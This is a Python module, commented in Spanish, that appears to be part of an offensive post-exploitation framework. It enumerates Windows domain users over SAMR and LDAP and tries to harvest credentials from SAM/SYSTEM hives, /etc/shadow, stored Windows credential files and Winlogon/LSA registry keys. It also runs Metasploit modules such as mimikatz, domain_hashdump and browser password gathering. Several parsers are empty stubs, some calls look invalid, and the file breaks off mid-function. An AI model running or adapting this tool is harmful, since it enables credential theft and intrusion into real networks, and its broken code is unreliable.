#!/usr/bin/env python3

import logging
import subprocess
import os
import time
import json
import re
import impacket
from impacket.dcerpc.v5 import rrp, samr
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection
from typing import Dict, List, Tuple
from pymetasploit3.msfrpc import MsfRpcClient

logger = logging.getLogger(__name__)

class UserEnumeration:
    def __init__(self, msf_client: MsfRpcClient, config: Dict):
        """Inicializa el módulo de enumeración de usuarios"""
        self.msf_client = msf_client
        self.config = config
        self.temp_dir = os.path.join(os.path.dirname(__file__), "..", "..", "temp")
        os.makedirs(self.temp_dir, exist_ok=True)
    
    def enumerate_users(self, target: str, credentials: Dict = None) -> Dict:
        """Realiza enumeración completa de usuarios"""
        result = {
            "users": [],
            "groups": [],
            "credentials": []
        }
        
        try:
            # Enumeración RPC
            rpc_users = self._enumerate_rpc_users(target, credentials)
            result["users"].extend(rpc_users)
            
            # Enumeración LDAP
            ldap_users = self._enumerate_ldap_users(target, credentials)
            result["users"].extend(ldap_users)
            
            # Enumeración de archivos del sistema
            file_users = self._enumerate_file_users(target, credentials)
            result["users"].extend(file_users)
            
            # Extracción de credenciales
            credentials = self._extract_credentials(target, credentials)
            result["credentials"].extend(credentials)
            
            # Eliminar duplicados
            result["users"] = list(set(result["users"]))
            result["groups"] = list(set(result["groups"]))
            result["credentials"] = list(set(result["credentials"]))
        
        except Exception as e:
            logger.error(f"Error en enumeración de usuarios: {str(e)}")
        
        return result
    
    def _enumerate_rpc_users(self, target: str, credentials: Dict = None) -> List[str]:
        """Enumera usuarios mediante RPC"""
        users = []
        
        try:
            # Crear conexión SMB
            smb = SMBConnection(target, target)
            if credentials:
                smb.login(credentials.get("username", ""), credentials.get("password", ""))
            else:
                smb.login("", "")
            
            # Enumerar usuarios mediante SAMR
            dce = smb.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)
            
            resp = samr.hSamrConnect(dce)
            serverHandle = resp['ServerHandle']
            
            resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
            domains = resp['Buffer']['Buffer']
            
            for domain in domains:
                resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domain['Name'])
                domainSid = resp['DomainId']
                
                resp = samr.hSamrOpenDomain(dce, serverHandle, samr.MAXIMUM_ALLOWED, domainSid)
                domainHandle = resp['DomainHandle']
                
                resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle)
                users.extend([user['Name'] for user in resp['Buffer']['Buffer']])
        
        except Exception as e:
            logger.error(f"Error en enumeración RPC: {str(e)}")
        
        return users
    
    def _enumerate_ldap_users(self, target: str, credentials: Dict = None) -> List[str]:
        """Enumera usuarios mediante LDAP"""
        users = []
        
        try:
            # Crear conexión LDAP
            ldap_conn = ldap.LDAPConnection(f"ldap://{target}")
            if credentials:
                ldap_conn.login(credentials.get("username", ""), credentials.get("password", ""))
            else:
                ldap_conn.login("", "")
            
            # Buscar usuarios
            searchFilter = "(&(objectClass=user)(objectCategory=person))"
            attributes = ["sAMAccountName", "memberOf"]
            
            resp = ldap_conn.search(searchFilter=searchFilter, attributes=attributes)
            
            for item in resp:
                if isinstance(item, ldapasn1.SearchResultEntry):
                    user = {}
                    for attribute in item['attributes']:
                        if str(attribute['type']) == 'sAMAccountName':
                            user['username'] = str(attribute['vals'][0])
                        elif str(attribute['type']) == 'memberOf':
                            user['groups'] = [str(group) for group in attribute['vals']]
                    users.append(user)
        
        except Exception as e:
            logger.error(f"Error en enumeración LDAP: {str(e)}")
        
        return users
    
    def _enumerate_file_users(self, target: str, credentials: Dict = None) -> List[str]:
        """Enumera usuarios mediante archivos del sistema"""
        users = []
        
        try:
            # Crear conexión SMB
            smb = SMBConnection(target, target)
            if credentials:
                smb.login(credentials.get("username", ""), credentials.get("password", ""))
            else:
                smb.login("", "")
            
            # Archivos comunes para buscar usuarios
            files_to_check = [
                "C:\\Windows\\System32\\config\\SAM",
                "C:\\Windows\\System32\\config\\SYSTEM",
                "C:\\Windows\\repair\\SAM",
                "C:\\Windows\\repair\\SYSTEM",
                "/etc/passwd",
                "/etc/shadow"
            ]
            
            for file_path in files_to_check:
                try:
                    with smb.openFile("C$", file_path) as file:
                        content = file.read()
                        
                        # Buscar patrones de usuario
                        if "passwd" in file_path:
                            users.extend(self._parse_passwd_file(content))
                        elif "SAM" in file_path:
                            users.extend(self._parse_sam_file(content))
                except:
                    continue
        
        except Exception as e:
            logger.error(f"Error en enumeración de archivos: {str(e)}")
        
        return users
    
    def _extract_credentials(self, target: str, credentials: Dict = None) -> List[Dict]:
        """Extrae credenciales mediante diferentes métodos"""
        found_credentials = []
        
        try:
            # Extraer credenciales de memoria
            memory_creds = self._extract_memory_credentials(target, credentials)
            found_credentials.extend(memory_creds)
            
            # Extraer credenciales de archivos
            file_creds = self._extract_file_credentials(target, credentials)
            found_credentials.extend(file_creds)
            
            # Extraer credenciales de registro
            registry_creds = self._extract_registry_credentials(target, credentials)
            found_credentials.extend(registry_creds)
            
            # Extraer credenciales de navegadores
            browser_creds = self._extract_browser_credentials(target, credentials)
            found_credentials.extend(browser_creds)
        
        except Exception as e:
            logger.error(f"Error en extracción de credenciales: {str(e)}")
        
        return found_credentials
    
    def _extract_memory_credentials(self, target: str, credentials: Dict = None) -> List[Dict]:
        """Extrae credenciales de memoria"""
        found_creds = []
        
        try:
            if not self.msf_client:
                return found_creds
            
            # Usar módulos de Metasploit para extraer credenciales
            modules = [
                "windows/gather/credentials/mimikatz",
                "windows/gather/credentials/windows_autologin",
                "windows/gather/credentials/domain_hashdump"
            ]
            
            for module in modules:
                try:
                    # Configurar módulo
                    cred_module = self.msf_client.modules.use('post', module)
                    cred_module['SESSION'] = credentials.get("session_id", "")
                    
                    # Ejecutar módulo
                    result = cred_module.execute()
                    
                    if result and "credentials" in result:
                        found_creds.extend(result["credentials"])
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error en extracción de credenciales de memoria: {str(e)}")
        
        return found_creds
    
    def _extract_file_credentials(self, target: str, credentials: Dict = None) -> List[Dict]:
        """Extrae credenciales de archivos"""
        found_creds = []
        
        try:
            # Crear conexión SMB
            smb = SMBConnection(target, target)
            if credentials:
                smb.login(credentials.get("username", ""), credentials.get("password", ""))
            else:
                smb.login("", "")
            
            # Archivos comunes para buscar credenciales
            files_to_check = [
                "C:\\Windows\\System32\\config\\SAM",
                "C:\\Windows\\System32\\config\\SYSTEM",
                "C:\\Windows\\repair\\SAM",
                "C:\\Windows\\repair\\SYSTEM",
                "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\*",
                "C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\*"
            ]
            
            for file_path in files_to_check:
                try:
                    with smb.openFile("C$", file_path) as file:
                        content = file.read()
                        
                        # Buscar patrones de credenciales
                        if "SAM" in file_path:
                            found_creds.extend(self._parse_sam_credentials(content))
                        elif "Credentials" in file_path:
                            found_creds.extend(self._parse_credential_files(content))
                except:
                    continue
        
        except Exception as e:
            logger.error(f"Error en extracción de credenciales de archivos: {str(e)}")
        
        return found_creds
    
    def _extract_registry_credentials(self, target: str, credentials: Dict = None) -> List[Dict]:
        """Extrae credenciales del registro"""
        found_creds = []
        
        try:
            # Crear conexión SMB
            smb = SMBConnection(target, target)
            if credentials:
                smb.login(credentials.get("username", ""), credentials.get("password", ""))
            else:
                smb.login("", "")
            
            # Claves de registro comunes para credenciales
            registry_keys = [
                "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP",
                "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"
            ]
            
            for key in registry_keys:
                try:
                    # Leer valor del registro
                    value = smb.getRegValue("HKLM", key)
                    
                    # Buscar credenciales en el valor
                    if value:
                        found_creds.extend(self._parse_registry_credentials(value))
                except:
                    continue
        
        except Exception as e:
            logger.error(f"Error en extracción de credenciales del registro: {str(e)}")
        
        return found_creds
    
    def _extract_browser_credentials(self, target: str, credentials: Dict = None) -> List[Dict]:
        """Extrae credenciales de navegadores"""
        found_creds = []
        
        try:
            if not self.msf_client:
                return found_creds
            
            # Usar módulos de Metasploit para extraer credenciales de navegadores
            modules = [
                "windows/gather/credentials/chrome",
                "windows/gather/credentials/firefox",
                "windows/gather/credentials/opera"
            ]
            
            for module in modules:
                try:
                    # Configurar módulo
                    cred_module = self.msf_client.modules.use('post', module)
                    cred_module['SESSION'] = credentials.get("session_id", "")
                    
                    # Ejecutar módulo
                    result = cred_module.execute()
                    
                    if result and "credentials" in result:
                        found_creds.extend(result["credentials"])
                
                except Exception as e:
                    logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error en extracción de credenciales de navegadores: {str(e)}")
        
        return found_creds
    
    def _parse_passwd_file(self, content: bytes) -> List[str]:
        """Parsea archivo passwd para extraer usuarios"""
        users = []
        try:
            for line in content.decode().split('\n'):
                if ':' in line:
                    username = line.split(':')[0]
                    if username and username != 'root':
                        users.append(username)
        except:
            pass
        return users
    
    def _parse_sam_file(self, content: bytes) -> List[str]:
        """Parsea archivo SAM para extraer usuarios"""
        users = []
        try:
            # Implementar parsing de SAM
            pass
        except:
            pass
        return users
    
    def _parse_sam_credentials(self, content: bytes) -> List[Dict]:
        """Parsea archivo SAM para extraer credenciales"""
        credentials = []
        try:
            # Implementar parsing de credenciales SAM
            pass
        except:
            pass
        return credentials
    
    def _parse_credential_files(self, content: bytes) -> List[Dict]:
        """Parsea archivos de credenciales"""
        credentials = []
        try:
            # Implementar parsing de archivos de credenciales
            pass
        except:
            pass
        return credentials
    
    def _parse_registry_credentials(self, content: bytes) -> List[Dict]:
        """Parsea valores del registro para extraer credenciales"""
        credentials = []
        try:
            # Implementar parsing de credenciales del registro
            pass
        except:
            pass
 